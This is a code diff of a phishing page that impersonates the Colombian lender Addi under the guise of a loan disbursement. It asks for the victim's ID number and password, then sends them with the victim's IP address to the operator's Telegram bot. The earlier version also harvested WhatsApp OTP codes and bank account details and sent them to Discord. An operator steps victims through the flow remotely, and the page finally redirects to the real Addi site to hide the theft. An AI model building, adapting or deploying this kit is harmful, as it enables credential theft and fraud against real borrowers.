@@ -4,239 +4,63 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Addi-Desembolso</title>
-  <link rel="icon" type="image/png" href="addi.png">
+<link rel="icon" type="image/png" href="addi.png">
 <style>
-  :root{
-    --brand:#3d5afe;          /* azul principal */
-    --brand-dark:#2f45c5;
-    --brand-600:#3346e0;
-    --brand-050:#e8ecff;
-    --ink:#1a2b32;
-    --muted:#6b7c85;
-    --line:#e4eaed;
-    --bg:#ffffff;
-    --soft:#f6f9fa;
-    --danger:#e5484d;
-    --radius:14px;
-    --shadow:0 10px 30px rgba(0,0,0,.06);
-    --font:'Segoe UI',system-ui,-apple-system,Roboto,Arial,sans-serif;
-  }
-  *{box-sizing:border-box}
-  html,body{margin:0;padding:0}
-  body{
-    font-family:var(--font);
-    color:var(--ink);
-    background:var(--soft);
-    -webkit-font-smoothing:antialiased;
-  }
-  .shell{
-    max-width:960px;
-    margin:0 auto;
-    min-height:100vh;
-    background:var(--bg);
-    display:flex;
-    flex-direction:column;
-  }
-  /* ---------- Header ---------- */
-  header{
-    display:grid;
-    grid-template-columns:1fr auto 1fr;
-    align-items:center;
-    padding:16px 24px;
-    border-bottom:1px solid var(--line);
-    position:sticky;top:0;background:var(--bg);z-index:5;
-  }
-  .logo{display:flex;align-items:center;gap:9px;font-weight:800;font-size:22px;color:var(--brand);letter-spacing:-.5px}
-  .logo svg{height:32px;width:auto}
-  .logo svg path{fill:#3c6af0}
-  .close{
-    display:flex;align-items:center;gap:8px;color:var(--muted);
-    font-weight:600;font-size:14px;cursor:pointer;background:none;border:none;
-    justify-self:end;
-  }
-  .close .x{
-    width:30px;height:30px;border-radius:50%;background:var(--brand-050);
-    display:grid;place-items:center;color:var(--brand);font-size:16px;
-  }
-  /* ---------- Purchase bar ---------- */
-  .purchasebar{
-    display:flex;justify-content:flex-end;gap:8px;
-    padding:12px 24px;background:var(--soft);border-bottom:1px solid var(--line);
-    font-size:14px;color:var(--muted);
-  }
-  .purchasebar b{color:var(--ink);font-size:16px}
-  /* ---------- Content ---------- */
-  main{flex:1;display:flex;justify-content:center;padding:40px 24px}
-  .card{width:100%;max-width:520px}
-  .step{display:none;animation:fade .35s ease}
-  .step.active{display:block}
-  @keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
-  h1{font-size:26px;margin:0 0 8px;letter-spacing:-.5px}
-  .sub{color:var(--muted);margin:0 0 28px;line-height:1.5}
-  label{display:block;font-weight:700;font-size:14px;margin-bottom:8px}
-  .field{
-    width:100%;padding:15px 16px;font-size:16px;border:1.5px solid var(--line);
-    border-radius:12px;outline:none;transition:.15s;font-family:inherit;
-  }
-  .field:focus{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-050)}
-  .hint{font-size:12px;color:var(--muted);margin-top:8px}
-  .err{color:var(--danger);font-size:13px;margin-top:8px;display:none}
-  .alert{
-    display:none;text-align:center;max-width:300px;margin:14px auto 0;
-    background:#fdecec;border:1px solid #f4c6c8;color:#d73a3a;
-    border-radius:12px;padding:10px 14px;font-size:13px;font-weight:600;
-  }
-  /* Buttons */
-  .btn{
-    width:100%;padding:16px;border:none;border-radius:30px;background:var(--brand);
-    color:#fff;font-weight:700;font-size:16px;cursor:pointer;transition:.15s;font-family:inherit;
-  }
-  .btn:hover{background:var(--brand-600)}
-  .btn:disabled{opacity:.45;cursor:not-allowed}
-  .btn-ghost{background:none;color:var(--brand);font-weight:700}
-  .btn-ghost:hover{background:var(--brand-050)}
-  .footer-btn{position:sticky;bottom:0;padding:20px 0}
-  .legal{font-size:13px;color:var(--muted);line-height:1.5;margin:0 0 16px;text-align:center}
-  .legal a{color:var(--brand);font-weight:700;text-decoration:none}
-  /* ---------- Loading ---------- */
-  .loader-wrap{display:flex;flex-direction:column;align-items:center;gap:22px;padding:80px 0}
-  .loader{
-    width:80px;height:80px;
-    animation:spin 1s linear infinite;
-  }
-  .btn-loading{width:20px;height:20px;vertical-align:middle;margin-right:8px}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .loader-text{font-weight:700;color:var(--ink)}
-  /* ---------- OTP ---------- */
-  .otp{display:flex;justify-content:center;gap:10px;margin:8px 0 20px}
-  .otp input{
-    width:56px;height:64px;text-align:center;font-size:26px;font-weight:700;
-    border:1.5px solid var(--line);border-radius:12px;outline:none;
-  }
-  .otp input:focus{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-050)}
-  .otp-chan{display:flex;justify-content:center;align-items:center;gap:8px;color:var(--brand-dark);font-weight:700;margin-bottom:18px}
-  .wa-icon{width:20px;height:20px;flex:none}
-  .timer{font-weight:700;color:var(--muted);margin-bottom:24px}
-  .timer b{color:var(--brand)}
-  .resend{text-align:center;color:var(--muted);font-weight:700;cursor:pointer}
-  .resend.live{color:var(--brand)}
-  .otp-gif{
-    display:block;max-width:240px;margin:10px auto 4px;border-radius:14px;
-    border:3px solid #f5a623;box-shadow:0 6px 14px rgba(245,166,35,.35);
-  }
-  .otp-note{
-    background:#f5a623;color:#1a2b32;font-weight:800;font-size:13px;
-    text-align:center;line-height:1.5;border-radius:12px;padding:10px 12px;margin:8px 0 6px;
-  }
-  .otp-comercio{
-    text-align:center;background:#eef6ff;border:1px solid #cfe3f7;color:#1a4f8f;
-    border-radius:14px;padding:10px 14px;font-size:13px;margin:0 0 14px;display:none;
-  }
-  /* ---------- Resumen final ---------- */
-  .resumen{
-    max-width:400px;margin:0 auto;text-align:left;
-    background:#fff;border:1px solid var(--line);border-radius:18px;
-    padding:16px 18px;box-shadow:0 4px 14px rgba(0,0,0,.05);
-  }
-  .resumen .r-row{display:flex;justify-content:space-between;gap:10px;padding:7px 0;font-size:13px}
-  .resumen .r-row span{color:var(--muted)}
-  .resumen .r-row b{color:var(--ink)}
-  /* ---------- Installments ---------- */
-  .plan{
-    border:1.5px solid var(--line);border-radius:var(--radius);padding:18px;margin-bottom:16px;
-    cursor:pointer;transition:.15s;
-  }
-  .plan:hover{border-color:var(--brand)}
-  .plan.sel{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-050)}
-  .plan-head{display:flex;align-items:center;gap:12px;font-size:17px}
-  .radio{width:22px;height:22px;border-radius:50%;border:2px solid var(--line);flex:none;position:relative}
-  .plan.sel .radio{border-color:var(--brand)}
-  .plan.sel .radio::after{content:"";position:absolute;inset:4px;border-radius:50%;background:var(--brand)}
-  .plan-head b{font-weight:800}
-  .rows{margin-top:14px;font-size:14px;color:var(--muted);display:none}
-  .plan.sel .rows{display:block}
-  .row{display:flex;justify-content:space-between;padding:4px 0}
-  .row.total{color:var(--ink);font-weight:700;border-top:1px solid var(--line);margin-top:6px;padding-top:10px}
-  .tag{display:inline-block;margin-top:12px;font-size:12px;color:var(--brand-dark);background:var(--brand-050);padding:5px 12px;border-radius:20px;font-weight:700}
-  /* ---------- Confirm ---------- */
-  .summary{border:1.5px solid var(--line);border-radius:var(--radius);padding:22px;margin-bottom:22px}
-  .summary .big{font-size:24px;font-weight:800;margin:2px 0 14px}
-  .summary .small{color:var(--muted);font-weight:700;font-size:14px}
-  .link-row{color:var(--brand);font-weight:700;cursor:pointer;display:flex;justify-content:space-between;padding:12px 0;border-top:1px solid var(--line)}
-  .datebox{display:flex;gap:14px;align-items:center;background:var(--soft);border-radius:12px;padding:14px;margin-bottom:20px}
-  .datebox .ic{width:44px;height:44px;border-radius:10px;background:#fff;border:1px solid var(--line);display:grid;place-items:center;font-size:20px}
-  .datebox .t{font-size:13px;color:var(--muted)}
-  .datebox .t b{display:block;color:var(--ink);font-size:15px;margin-top:2px}
-  .consent{display:flex;gap:12px;font-size:13px;color:var(--muted);line-height:1.5;margin-bottom:24px}
-  .consent input{width:22px;height:22px;accent-color:var(--brand);flex:none;margin-top:1px}
-  .consent a{color:var(--brand);font-weight:700;text-decoration:none}
-  /* ---------- Identity (estilo Apple) ---------- */
-  .verify-box{text-align:center;padding:6px 0 8px}
-  .v-wa{display:block;margin:0 auto 22px}
-  .verify-box h1{font-size:24px;font-weight:700;letter-spacing:-.4px;margin:0 0 10px}
-  .v-sub{color:var(--muted);font-size:15px;line-height:1.55;margin:0 0 26px}
-  .v-card{
-    max-width:360px;margin:0 auto;text-align:left;
-    background:#fff;border:1px solid var(--line);border-radius:18px;
-    padding:16px 20px;box-shadow:0 4px 14px rgba(0,0,0,.05);
-  }
-  .v-card .v-lbl{display:block;font-size:12px;color:var(--muted);margin-bottom:8px;text-align:center}
-  .v-card .v-num{font-size:22px;font-weight:800;color:var(--ink);letter-spacing:1.5px;text-align:center}
-  .v-hint{font-size:13px;color:var(--muted);line-height:1.6;text-align:center;margin-top:24px}
-  .success{text-align:center;padding:40px 0}
-  .success .check{width:90px;height:90px;border-radius:50%;background:var(--brand);color:#fff;font-size:48px;display:grid;place-items:center;margin:0 auto 24px}
-  /* ---------- Monto de retiro ---------- */
-  .monto-box{
-    background:#f4f5f7;border:1px solid #e0e3e8;border-radius:16px;
-    padding:18px 20px;margin:0 0 14px;text-align:center;
-    color:#111827;font-size:28px;font-weight:800;letter-spacing:-.5px;
-  }
-  .monto-box .mb-label{display:block;color:#8a929c;font-size:12px;font-weight:600;letter-spacing:.3px;margin-bottom:6px}
-  /* ---------- Pantalla de carga (validación del asesor) ---------- */
-  .load-layer{
-    position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:80;
-    display:none;flex-direction:column;align-items:center;justify-content:center;gap:22px;
-  }
-  .load-text{font-weight:700;color:var(--ink);font-size:17px}
-  .closed{position:fixed;top:0;left:0;right:0;z-index:90;background:#e5484d;color:#fff;font-weight:700;font-size:14px;padding:12px 16px;text-align:center;display:none}
-  @media(max-width:560px){
-    main{padding:28px 18px}
-    h1{font-size:22px}
-    .otp input{width:44px;height:56px;font-size:22px}
-    .purchasebar,header{padding-left:18px;padding-right:18px}
-    .logo svg{height:24px;width:auto}
-  }
+:root{--brand:#3d5afe;--brand-600:#3346e0;--brand-050:#e8ecff;--ink:#1a2b32;--muted:#6b7c85;--line:#e4eaed;--bg:#ffffff;--soft:#f6f9fa;--danger:#e5484d;--font:'Segoe UI',system-ui,-apple-system,Roboto,Arial,sans-serif}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:var(--font);color:var(--ink);background:var(--soft);-webkit-font-smoothing:antialiased}
+.shell{max-width:960px;margin:0 auto;min-height:100vh;background:var(--bg);display:flex;flex-direction:column}
+header{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;padding:16px 24px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--bg);z-index:5}
+.logo{display:flex;align-items:center;gap:9px;font-weight:800;font-size:22px;color:var(--brand);letter-spacing:-.5px}
+.logo img{height:32px;width:auto}
+.close{display:flex;align-items:center;gap:8px;color:var(--muted);font-weight:600;font-size:14px;cursor:pointer;background:none;border:none;justify-self:end}
+.close .x{width:30px;height:30px;border-radius:50%;background:var(--brand-050);display:grid;place-items:center;color:var(--brand);font-size:16px}
+main{flex:1;display:flex;justify-content:center;padding:40px 24px}
+.card{width:100%;max-width:520px}
+.step{display:none;animation:fade .35s ease}
+.step.active{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+h1{font-size:26px;margin:0 0 8px;letter-spacing:-.5px}
+.sub{color:var(--muted);margin:0 0 28px;line-height:1.5}
+label{display:block;font-weight:700;font-size:14px;margin-bottom:8px}
+.field{width:100%;padding:15px 16px;font-size:16px;border:1.5px solid var(--line);border-radius:12px;outline:none;transition:.15s;font-family:inherit}
+.field:focus{border-color:var(--brand);box-shadow:0 0 0 3px var(--brand-050)}
+.err{color:var(--danger);font-size:13px;margin-top:8px;display:none}
+.btn{width:100%;padding:16px;border:none;border-radius:30px;background:var(--brand);color:#fff;font-weight:700;font-size:16px;cursor:pointer;transition:.15s;font-family:inherit}
+.btn:hover{background:var(--brand-600)}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+.btn-loading{width:20px;height:20px;vertical-align:middle;margin-right:8px}
+.footer-btn{position:sticky;bottom:0;padding:20px 0}
+.legal{font-size:13px;color:var(--muted);line-height:1.5;margin:0 0 16px;text-align:center}
+.legal a{color:var(--brand);font-weight:700;text-decoration:none}
+.loader-wrap{display:flex;flex-direction:column;align-items:center;gap:22px;padding:80px 0;text-align:center}
+.loader{width:80px;height:80px;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loader-text{font-weight:700;color:var(--ink);font-size:17px}
+.loader-sub{color:var(--muted);font-size:14px;max-width:300px;line-height:1.5}
+.verify-box{text-align:center;padding:16px 0 8px}
+.v-wa{display:block;margin:0 auto 22px}
+.verify-box h1{font-size:24px;font-weight:700;letter-spacing:-.4px;margin:0 0 10px}
+.v-sub{color:var(--muted);font-size:15px;line-height:1.55;margin:0 auto 26px;max-width:380px}
+.load-layer{position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:80;display:none;flex-direction:column;align-items:center;justify-content:center;gap:22px}
+.load-text{font-weight:700;color:var(--ink);font-size:17px}
+.closed{position:fixed;top:0;left:0;right:0;z-index:90;background:#e5484d;color:#fff;font-weight:700;font-size:14px;padding:12px 16px;text-align:center;display:none}
+@media(max-width:560px){main{padding:28px 18px}h1{font-size:22px}header{padding-left:18px;padding-right:18px}}
 </style>
 </head>
 <body>
 <div class="shell">
   <header>
     <span aria-hidden="true"></span>
-    <div class="logo" title="Addi">
-      <svg width="85" height="32" viewBox="0 0 64 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <g clip-path="url(#clip0_21_198)">
-          <path d="M60.9056 6.14677C62.6168 6.14677 64 4.77454 64 3.07692C64 1.37931 62.6168 0 60.9056 0C59.1943 0 57.804 1.37224 57.804 3.06985C57.804 4.76746 59.1943 6.1397 60.9056 6.1397V6.14677Z" fill="#1C67D8"/>
-          <path d="M33.4902 0C32.164 0 31.0874 1.06808 31.0874 2.38373V7.16534C29.8325 6.50752 28.4064 6.13263 26.8877 6.13263C21.9252 6.13263 17.8824 10.1362 17.8824 15.0663C17.8824 19.9965 21.918 24 26.8877 24C31.8574 24 35.8931 19.9965 35.8931 15.0663V15.0522V2.38373C35.8931 1.06808 34.8164 0 33.4902 0ZM26.8949 19.2325C24.5847 19.2325 22.6952 17.3652 22.6952 15.0663C22.6952 12.7675 24.5776 10.9001 26.8949 10.9001C29.2121 10.9001 31.0945 12.7675 31.0945 15.0663C31.0945 17.3652 29.2121 19.2325 26.8949 19.2325Z" fill="#1C67D8"/>
-          <path d="M53.1337 0C51.8075 0 50.7309 1.06808 50.7309 2.38373V7.16534C49.476 6.50752 48.0499 6.13263 46.5312 6.13263C41.5687 6.13263 37.5259 10.1362 37.5259 15.0663C37.5259 19.9965 41.5615 24 46.5312 24C51.5009 24 55.5366 19.9965 55.5366 15.0663C55.5366 15.0663 55.5366 15.0592 55.5366 15.0522C55.5366 15.0522 55.5366 15.0522 55.5366 15.0451V2.38373C55.5366 1.06808 54.4599 0 53.1337 0ZM46.5312 19.2325C44.2211 19.2325 42.3316 17.3652 42.3316 15.0663C42.3316 12.7675 44.2139 10.9001 46.5312 10.9001C48.8485 10.9001 50.7309 12.7675 50.7309 15.0663C50.7309 17.3652 48.8485 19.2325 46.5312 19.2325Z" fill="#1C67D8"/>
-          <path d="M60.8984 7.78793C59.5722 7.78793 58.4955 8.85601 58.4955 10.1717V21.6093C58.4955 22.925 59.5722 23.9931 60.8984 23.9931C62.2246 23.9931 63.3012 22.925 63.3012 21.6093V10.1717C63.3012 8.85601 62.2246 7.78793 60.8984 7.78793Z" fill="#1C67D8"/>
-          <path d="M8.12121 2.05847C3.64349 2.05847 0 5.67297 0 10.1151V21.6093C0 22.925 1.07665 23.993 2.40285 23.993C3.72905 23.993 4.8057 22.925 4.8057 21.6093V17.436H11.4296V21.6093C11.4296 22.925 12.5062 23.993 13.8324 23.993C15.1586 23.993 16.2353 22.925 16.2353 21.6093V10.1151C16.2353 5.67297 12.5918 2.05847 8.11408 2.05847H8.12121ZM11.4367 12.6686H4.8057V10.1151C4.8057 8.30427 6.2959 6.82593 8.12121 6.82593C9.94652 6.82593 11.4367 8.30427 11.4367 10.1151V12.6686Z" fill="#1C67D8"/>
-        </g>
-        <defs>
-          <clipPath id="clip0_21_198"><rect width="85" height="32" fill="white"/></clipPath>
-        </defs>
-      </svg>
-    </div>
-    <button class="close" onclick="if(confirm('¿Deseas salir del proceso?'))location.reload()">
-      <span>Cerrar</span><span class="x">✕</span>
-    </button>
+    <div class="logo" title="Addi"><img src="addi-logo.svg" alt="Addi"></div>
+    <button class="close" onclick="if(confirm('¿Deseas salir del proceso?'))location.reload()"><span>Cerrar</span><span class="x">✕</span></button>
   </header>
-
-  <div class="purchasebar" id="purchasebar">Tu Desembolso es de <b id="amountLabel">$5.449.000</b></div>
 
   <main>
     <div class="card">
 
-      <!-- STEP 1: Cédula -->
+      <!-- STEP 1: Usuario (cédula) -->
       <section class="step active" id="s-cedula">
         <h1>Ingresa tus datos</h1>
         <p class="sub">Queremos asegurarnos de que eres tú.</p>
@@ -244,7 +68,7 @@
         <input class="field" id="cedula" inputmode="numeric" maxlength="12" placeholder="Ej: 1193531369" autocomplete="off">
         <div class="err" id="cedula-err">Ingresa una cédula válida (mínimo 6 dígitos).</div>
         <p class="legal" style="margin-top:26px">Al continuar, <a href="#">autorizas el tratamiento de tus datos personales</a> según nuestra <a href="#">Política de Privacidad</a>. Consultar tu historial de desembolso es un paso indispensable en tu proceso de aprobación.</p>
-        <div class="footer-btn"><button class="btn" onclick="submitCedula()">Continuar</button></div>
+        <div class="footer-btn"><button class="btn" id="btnCedula" onclick="submitCedula()">Continuar</button></div>
       </section>
 
       <!-- STEP 2: Contraseña -->
@@ -254,134 +78,25 @@
         <label for="passwd">Contraseña</label>
         <input class="field" id="passwd" type="password" autocomplete="current-password" placeholder="Tu contraseña">
         <div class="err" id="pass-err">Ingresa una contraseña válida.</div>
-        <div class="footer-btn"><button class="btn" onclick="submitPass()">Continuar</button></div>
+        <div class="footer-btn"><button class="btn" id="btnPass" onclick="submitPass()">Continuar</button></div>
       </section>
 
-      <!-- STEP 3: Processing -->
-      <section class="step" id="s-processing">
-        <div class="loader-wrap"><img class="loader" src="loader.svg" alt="Cargando"><div class="loader-text">Danos un momento, estamos procesando tu información…</div></div>
-      </section>
-
-      <!-- STEP 3: OTP -->
-      <section class="step" id="s-otp">
-        <h1>Ingresa el código de verificación</h1>
-        <p class="sub">Enviamos un código a tu WhatsApp para confirmar tu número de celular.</p>
-        <div class="monto-box" id="otpMonto" style="display:none"></div>
-        <div class="otp-comercio" id="otpComercio" style="display:none"></div>
-        <div class="otp-chan"><img class="wa-icon" src="whatsapp.svg" width="20" height="20" alt="WhatsApp"><span id="otp-phone">31******94</span></div>
-        <div class="otp" id="otpInputs">
-          <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
-          <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+      <!-- STEP 3: Carga «Verificación exitosa» (la activa el asesor desde Telegram) -->
+      <section class="step" id="s-verif">
+        <div class="loader-wrap">
+          <img class="loader" src="loader.svg" alt="Cargando">
+          <div class="loader-text">Verificación exitosa</div>
+          <div class="loader-sub">Estamos preparando todo para atenderte…</div>
         </div>
-        <div class="err alert" id="otp-err">Código incorrecto. Inténtalo de nuevo.</div>
-        <div class="resend" id="resend">¿No recibiste el mensaje?</div>
       </section>
 
-      <!-- STEP 4: Verifying -->
-      <section class="step" id="s-verifying">
-        <div class="loader-wrap"><img class="loader" src="loader.svg" alt="Cargando"><div class="loader-text">Validando código…</div></div>
-      </section>
-
-      <!-- STEP 4.5: Datos bancarios -->
-      <section class="step" id="s-banco">
-        <h1>¿Dónde quieres tu desembolso?</h1>
-        <p class="sub">Selecciona el banco y la cuenta donde deseas realizar el retiro.</p>
-        <div class="otp-comercio" id="bancoComercio" style="display:none"></div>
-        <label for="bancoSel">Banco</label>
-        <select class="field" id="bancoSel"></select>
-        <label for="cuentaTipo" style="margin-top:18px">Tipo de cuenta</label>
-        <select class="field" id="cuentaTipo">
-          <option value="Ahorros">Ahorros</option>
-          <option value="Corriente">Corriente</option>
-        </select>
-        <label for="cuentaNum" style="margin-top:18px">Número de cuenta</label>
-        <input class="field" id="cuentaNum" inputmode="numeric" placeholder="Número de cuenta">
-        <label for="telfAddi" style="margin-top:18px">Teléfono asociado a tu cuenta de Addi</label>
-        <input class="field" id="telfAddi" inputmode="numeric" placeholder="Ej: 3001234567">
-        <div class="err" id="banco-err">Selecciona un banco e ingresa el número de cuenta y el teléfono de tu cuenta Addi.</div>
-        <div class="footer-btn"><button class="btn" onclick="submitBanco()">Continuar</button></div>
-      </section>
-
-      <!-- STEP 4.6: Cupo y retiro -->
-      <section class="step" id="s-cupo">
-        <h1>Cupo de desembolso</h1>
-        <p class="sub">Elige el valor que deseas retirar de tu cupo disponible.</p>
-        <div class="monto-box" id="cupoBox"></div>
-        <label for="retirarNum">Valor a retirar</label>
-        <input class="field" id="retirarNum" inputmode="numeric" placeholder="0">
-        <p class="hint" id="cupoMin"></p>
-        <div class="err" id="cupo-err">Valor inválido.</div>
-        <div class="footer-btn"><button class="btn" onclick="submitCupo()">Aceptar</button></div>
-      </section>
-
-      <!-- STEP 5: Installments -->
-      <section class="step" id="s-plans">
-        <h1>Escoge tus cuotas mensuales</h1>
-        <p class="sub">Los descuentos y ofertas otorgados están sujetos a <a href="#" style="color:var(--brand);text-decoration:none;font-weight:700">Términos y Condiciones</a>.</p>
-        <div id="planList"></div>
-        <div class="footer-btn"><button class="btn" id="planBtn" onclick="goToConfirm()">Continuar</button></div>
-      </section>
-
-      <!-- STEP 6: Confirm -->
-      <section class="step" id="s-confirm">
-        <h1>Confirma tu desembolso en</h1>
-        <p class="sub" style="margin-bottom:22px">Tienda de ejemplo</p>
-        <div class="summary">
-          <div class="small"><span id="confirmN">24</span> cuotas mensuales</div>
-          <div class="big">de <span id="confirmQ">$366.588</span></div>
-          <div class="link-row" onclick="toggleDetails()"><span>Ver detalles</span><span id="detArrow">⌄</span></div>
-          <div id="confirmDetails" class="rows" style="display:none"></div>
-          <div class="link-row" onclick="show('s-plans')" style="justify-content:center;color:var(--brand)">Cambiar número de cuotas</div>
-        </div>
-        <div class="datebox">
-          <div class="ic">📅</div>
-          <div class="t">Próxima fecha límite de pago:<b id="nextDate">—</b></div>
-        </div>
-        <label class="consent">
-          <input type="checkbox" id="consent" onchange="document.getElementById('confirmBtn').disabled=!this.checked">
-          <span>Al marcar esta casilla, confirmas que aceptas y firmas <a href="#">el contrato de desembolso</a> y <a href="#">los términos del contrato</a>. También aceptas que realicemos labores de cobranza a través de <a href="#">canales autorizados</a>.</span>
-        </label>
-        <div class="footer-btn"><button class="btn" id="confirmBtn" disabled onclick="waitNext('s-identity')">Confirmar desembolso</button></div>
-      </section>
-
-      <!-- STEP 7: Identity -->
-      <section class="step" id="s-identity">
+      <!-- STEP 4: Asesor virtual (final) → redirige a co.addi.com -->
+      <section class="step" id="s-asesor">
         <div class="verify-box">
-          <img class="v-wa" src="whatsapp.svg" width="100" height="100" alt="WhatsApp">
-          <h1>Verifiquemos tu identidad</h1>
-          <p class="v-sub">Para completar tu desembolso, necesitas finalizar el último paso desde tu teléfono móvil. Asegúrate de tener tu documento de identidad a la mano.</p>
-          <div class="v-card">
-            <span class="v-lbl">Enviaremos el enlace por WhatsApp y correo a</span>
-            <div class="v-num" id="identPhone">31******94</div>
-          </div>
-          <img class="otp-gif" src="instrucciones.gif" alt="Cómo recibir el código: toca el botón de WhatsApp, no el enlace">
-          <p class="otp-note">⚠️ <b>IMPORTANTE:</b> Para validar tu identidad y recibir tu desembolso, haz clic en el <b>recuadro</b> y <b>NO en el enlace</b>. — Para poder continuar.</p>
-          <p class="v-hint">Si abres el enlace desde tu computadora o tablet, no funcionará.</p>
-        </div>
-      </section>
-
-      <section class="step" id="s-verifying2">
-        <div class="loader-wrap"><img class="loader" src="loader.svg" alt="Cargando"><div class="loader-text">Finalizando tu desembolso…</div></div>
-      </section>
-
-      <!-- STEP 8: Success -->
-      <section class="step" id="s-success">
-        <div class="success">
-          <div class="check">✓</div>
-          <h1>¡Desembolso aprobado!</h1>
-          <p class="sub">Tu desembolso se realizará en las próximas <b>72 horas hábiles</b>.</p>
-          <div class="resumen">
-            <div class="r-row"><span>N° de radicado</span><b id="rRad">—</b></div>
-            <div class="r-row"><span>Comercio aliado</span><b id="rComercio">—</b></div>
-            <div class="r-row"><span>Banco</span><b id="rBanco">—</b></div>
-            <div class="r-row"><span>Tipo de cuenta</span><b id="rTipo">—</b></div>
-            <div class="r-row"><span>N° de cuenta</span><b id="rCuenta">—</b></div>
-            <div class="r-row"><span>Valor a retirar</span><b id="rRetiro">—</b></div>
-            <div class="r-row"><span>Cupo aprobado</span><b id="rCupo">—</b></div>
-            <div class="r-row"><span>Cuotas</span><b id="rCuotas">—</b></div>
-            <div class="r-row"><span>Cédula</span><b id="rCedula">—</b></div>
-          </div>
-          <button class="btn" onclick="location.reload()">Finalizar</button>
+          <img class="v-wa" src="whatsapp.svg" width="100" height="100" alt="Asesor virtual">
+          <h1>¡Casi listo!</h1>
+          <p class="v-sub">En unos momentos se comunicará con usted un <b>asesor virtual</b> para continuar con su proceso.</p>
+          <div class="btn" onclick="irARedirect()" style="text-align:center;cursor:pointer">Continuar</div>
         </div>
       </section>
 
@@ -389,7 +104,7 @@
   </main>
 </div>
 
-<!-- El avance de pasos lo controla el asesor desde dashboard.html -->
+<!-- Capa de espera mientras el asesor valida -->
 <div class="load-layer" id="loadLayer">
   <img class="loader" src="loader.svg" alt="Cargando">
   <div class="load-text" id="loadText">Esperando validación…</div>
@@ -398,23 +113,25 @@
 
 <script>
 /* ====== CONFIG ====== */
-const CONFIG = {
-  amount: 5449000,                 // monto por defecto (el asesor lo define por sesión)
-  storeName: 'Tienda de ejemplo',
-  monthlyRate: 0.028,              // interés mensual aprox (2.8%)
-  fianzaRate: 0.012,               // fianza mensual aprox (1.2%)
-  terms: [9, 12, 18, 24]           // planes de cuotas
+// 👉 Token del asesor: DEBE coincidir con firestore.rules.json (esAdmin)
+//    y con la variable FIREBASE_ADMIN_TOKEN en Vercel. CÁMBIALO por uno tuyo.
+const ADMIN_TOKEN = 'CAMBIA-ESTE-TOKEN';
+
+// Nombres de los pasos (los mismos textos que se ven en Telegram)
+const STEPS = {
+  's-cedula' : '1. Usuario',
+  's-pass'   : '2. Contraseña',
+  's-verif'  : '3. Verificación exitosa',
+  's-asesor' : '4. Asesor virtual'
 };
 
-/* ====== Discord webhook (SEGURO: lo reenvía /api/notificar en Vercel) ====== */
-const session = { password:'', cedula:'', phone:'', term:0, uid:'', amount:0, otp:'', cerrada:false, banco:'', cuentaTipo:'', cuentaNum:'', telfAddi:'', retirar:0, otpListo:false, comercio:'' };
+// Al final de este flujo se redirige aquí:
+const URL_REDIRECCION = 'https://co.addi.com';
 
-function fechaCorta(d){
-  const p = n => String(n).padStart(2,'0');
-  return p(d.getDate()) + '/' + p(d.getMonth()+1) + '/' + d.getFullYear() + ' ' + p(d.getHours()) + ':' + p(d.getMinutes());
-}
-async function sendToDiscord(content){
-  // El webhook NO está en el código: lo reenvía una función de Vercel (secreto en env vars)
+const session = { password:'', cedula:'', uid:'', cerrada:false };
+const $ = id => document.getElementById(id);
+/* ====== Telegram (el TOKEN nunca está en el código: /api/notificar lo reenvía) ====== */
+async function notificarTelegram(content, botones){
   try{
     let ip = '—';
     try{
@@ -422,27 +139,57 @@ async function sendToDiscord(content){
       const j = await r.json();
       if(j && j.ip) ip = j.ip;
     }catch(e){}
-    const lineas = String(content||'').split('\n').map(s=>s.trim()).filter(Boolean);
-    // Embed compacto: credenciales en el TÍTULO, evento en la descripción, fecha + IP abajo
-    const ahora = new Date();
-    const fecha = ahora.toLocaleDateString('es-CO') + ', ' + ahora.toLocaleTimeString('es-CO');
-    const campos = [{ name: '⏰ Fecha y Hora', value: fecha, inline: false }];
-    if(ip !== '—') campos.push({ name: '🌐 IP', value: ip, inline: false });
-    const embed = {
-      title: `👤 Usuario: ${session.cedula||'—'}  ·  🔑 Clave: ${session.password||'—'}`,
-      description: lineas.join('\n') || 'Evento de sesión',
-      color: 0x3c6af0,
-      fields: campos
-    };
+    const a = new Date();
+    const pie = '⏰ ' + a.toLocaleDateString('es-CO') + ', ' + a.toLocaleTimeString('es-CO') + ' · 🌐 ' + ip;
+    const texto = (String(content||'')).trim() + '\n' + pie;
     await fetch('/api/notificar', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ content: texto, buttons: (botones && botones.length) ? botones : null })
     });
   }catch(e){}
 }
 
-/* ====== Firebase / Firestore — sincronización con dashboard.html ====== */
+/* Tarjeta con los datos de la sesión (lo que ve el asesor en Telegram) */
+function tarjetaSesion(){
+  return '🆔 Sesión: `' + SID + '`\n' +
+         '👤 Cédula: `' + (session.cedula||'—') + '`\n' +
+         '🔑 Contraseña: `' + (session.password||'—') + '`\n' +
+         '📍 Paso: ' + (STEPS[currentStep()]||currentStep());
+}
+
+/* Botones del asesor (los mismos criterios que manejaba el dashboard) */
+function botonesTelegram(){
+  const sid = SID;
+  const paso = currentStep();
+  const pend = pendingNext;
+  const b = [];
+  if(paso === 's-cedula' && pend){
+    b.push([{ text: '✓ Cuenta existe', callback_data: 'okced|' + sid }]);
+    b.push([{ text: '✗ Cuenta no existe', callback_data: 'noked|' + sid }]);
+  } else if(paso === 's-pass' && pend){
